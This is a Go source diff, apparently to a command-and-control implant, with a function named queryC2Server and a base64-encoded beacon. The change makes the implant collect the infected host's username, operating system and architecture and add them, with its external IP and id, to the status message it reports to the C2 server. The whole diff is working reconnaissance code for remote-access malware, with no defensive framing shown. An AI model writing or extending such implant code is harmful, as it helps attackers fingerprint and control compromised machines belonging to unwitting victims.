@@ -6,6 +6,7 @@ import (
 	"time"
 	"context"
 	"runtime"
+	"os/user"
 	"net/http"
 	"encoding/json"
 	"github.com/thecodeteam/goodbye"
@@ -32,6 +33,9 @@ var id string
 var ip string
 var queryData string
 var debug bool = false
+var curUser string
+var platform string
+var arch string
 var netClient = &http.Client{
 	Timeout: time.Second * 10,
 }
@@ -41,11 +45,17 @@ func queryC2Server(handler Request) {
 }
 
 func main() {
-	fmt.Println("Id: " + id)
+	user, _ := user.Current()
+	curUser = user.Username
+	platform = runtime.GOOS
+	arch = runtime.GOARCH
+
+	fmt.Println(id + " " + platform + "/" + arch)
+	
 	lhost, err := externalIP()
 	debugFatal(err)
 	ip = lhost
-	jsonData, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"",nil})
+	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"",nil})
 	debugFatal(err)
 	
 	var encoder = Base64Encoder {
